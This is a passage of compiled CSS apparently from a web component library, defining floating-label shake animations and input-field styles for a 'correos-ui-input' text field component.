				transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - 0%)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - 0%)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-120%) scale(0.8)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon {
			0% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon {
			0% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - 21px)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - 21px)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - 21px)) translateY(-120%) scale(0.8)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl {
			0% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl {
			0% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(4% - 0)) translateY(-34.75px) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(-4% - 0)) translateY(-34.75px) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75);
				transform: translateX(calc(0 - 0)) translateY(-34.75px) scale(0.75)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl {
			0% {
				-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl {
			0% {
				-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(4% - -21px)) translateY(-120%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(-4% - -21px)) translateY(-120%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8);
				transform: translateX(calc(0 - -21px)) translateY(-120%) scale(0.8)
			}
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-textarea {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-textarea {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(4% - 0%)) translateY(-130%) scale(0.75)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(-4% - 0%)) translateY(-130%) scale(0.75)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75);
				transform: translateX(calc(0 - 0%)) translateY(-130%) scale(0.75)
			}
		}

		.mdc-text-field-helper-text.sc-correos-ui-input {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.75rem;
			line-height: 1.25rem;
			font-weight: 400;
			letter-spacing: 0.0333333333em;
			text-decoration: inherit;
			text-transform: inherit;
			display: block;
			margin-top: 0;
			line-height: normal;
			margin: 0;
			-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			will-change: opacity
		}

		.mdc-text-field-helper-text.sc-correos-ui-input::before {
			display: inline-block;
			width: 0;
			height: 16px;
			content: "";
			vertical-align: 0
		}

		.mdc-text-field-helper-text--persistent.sc-correos-ui-input {
			-webkit-transition: none;
			transition: none;
			opacity: 1;
			will-change: initial
		}

		.sc-correos-ui-input-h {
			--_ui-input-bg-color: var(--ui-input-bg-color, #F3F2F2);
			--_ui-input-bg-light-color: var(--ui-input-bg-light-color, #ffe2e2);
			--_ui-input-border-radius: var(--ui-input-border-radius, 8px);
			--_ui-input-border-color: var(--ui-input-border-color, yellow);
			--_ui-input-error-color: var(--ui-input-error-color, rgb(243, 39, 192));
			--_ui-input-disabled-color: var(--ui-input-disabled-color, #333333);
			--_ui-input-field-color: var(--ui-input-field-color, #329b43);
			--_ui-input-field-color-empty: var(--ui-input-field-color-empty, #666666);
			--_ui-input-icon-size: var(--ui-input-icon-size, 24px);
			--_ui-input-icon-margin-right: var(--ui-input-icon-margin-right, 16px);
			--_ui-input-label-color: var(--ui-input-label-color, #000066);
			--_ui-input-line-color: var(--ui-input-line-color, rgb(0, 247, 255));
			--_ui-input-line-color-ripple: var(--ui-input-line-color-ripple, #000066);
			--_ui-input-valid-color: var(--ui-input-valid-color, #348F41);
			--ui-input-bg-light-color: var(--theme-color-white-plain)
		}

		.sc-correos-ui-input-h .sc-correos-ui-input-s>[slot=icon] {
			color: var(--_ui-input-label-color);
			fill: var(--_ui-input-label-color);
			margin-right: var(--_ui-input-icon-margin-right);
			height: var(--_ui-input-icon-size);
			width: var(--_ui-input-icon-size);
			display: inline-block;
			margin-bottom: 16px
		}

		.sc-correos-ui-input-h {
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap;
			-ms-flex-align: baseline;
			align-items: baseline
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			max-width: calc(100% - 32px);
			font-family: var(--theme-fontFamily-main)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			max-width: 100%
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			font-family: var(--theme-fontFamily-main)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-webkit-autofill+.mdc-floating-label.sc-correos-ui-input {
			-webkit-transform: translateY(-106%) scale(0.75);
			transform: translateY(-106%) scale(0.75)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:focus {
			outline: none
		}

		.sc-correos-ui-input-h .correos-ui-input_root.light.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
			background-color: var(--_ui-input-bg-light-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.light.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input.sc-correos-ui-input:before {
			opacity: 0;
			background-color: var(--_ui-input-bg-light-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
			width: 100%;
			display: inline-block;
			border-radius: var(--_ui-input-border-radius) var(--_ui-input-border-radius) 0 0;
			border-top: 1px solid var(--_ui-input-border-color);
			border-left: 1px solid var(--_ui-input-border-color);
			border-right: 1px solid var(--_ui-input-border-color)
		}

		@media (max-width: 639px) {
			.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
				height: 3rem
			}
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input::-webkit-outer-spin-button,
		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input::-webkit-inner-spin-button {
			-webkit-appearance: none;
			margin: 0
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input input[type=number].sc-correos-ui-input {
			-moz-appearance: textfield
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: var(--_ui-input-field-color-empty)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-line-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
			background-color: var(--_ui-input-bg-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
			background-color: var(--_ui-input-line-color-ripple)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
			border-bottom-color: var(--_ui-input-line-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--with-preppend-icon.sc-correos-ui-input {
			width: calc(100% - var(--_ui-input-icon-size) - var(--_ui-input-icon-margin-right))
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover input.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:focus input.sc-correos-ui-input {
			border-bottom: 2px solid;
			padding-bottom: 5px
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover input.sc-correos-ui-input {
			cursor: pointer
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:hover:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--_ui-input-field-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--_ui-input-label-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: var(--_ui-input-field-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
			background-color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--force-error.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
			color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
			fill: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
			background-color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
			color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--disabled.sc-correos-ui-input {
			border-top: 1px solid var(--_ui-input-border-color);
			border-left: 1px solid var(--_ui-input-border-color);
			border-right: 1px solid var(--_ui-input-border-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-disabled-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: var(--_ui-input-field-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error) .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
			fill: var(--_ui-input-valid-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--_ui-input-valid-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-valid-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-ui-input-h .correos-ui-input_root__invalid.sc-correos-ui-input {
			padding: 16px 0;
			display: block;
			width: 100%
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input:before {
			content: none
		}

		.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field-helper-text--opacity.sc-correos-ui-input {
			opacity: 100%
		}

		.sc-correos-ui-input-h .correos-ui-input_root__txt-invalid.sc-correos-ui-input {
			margin: 0
		}

		.sc-correos-ui-input-h .correos-ui-input_root__list-password.sc-correos-ui-input {
			margin-top: 8px;
			margin-bottom: 0;
			display: none;
			-ms-flex-pack: justify;
			justify-content: space-between;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-ui-input-h .correos-ui-input_root__list-password.active.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-ui-input-h .correos-ui-input_root__item-password.sc-correos-ui-input {
			-ms-flex: 0 1 50%;
			flex: 0 1 50%;
			text-align: left
		}

		.sc-correos-ui-input-h .correos-ui-input_root__icon-password.sc-correos-ui-input,
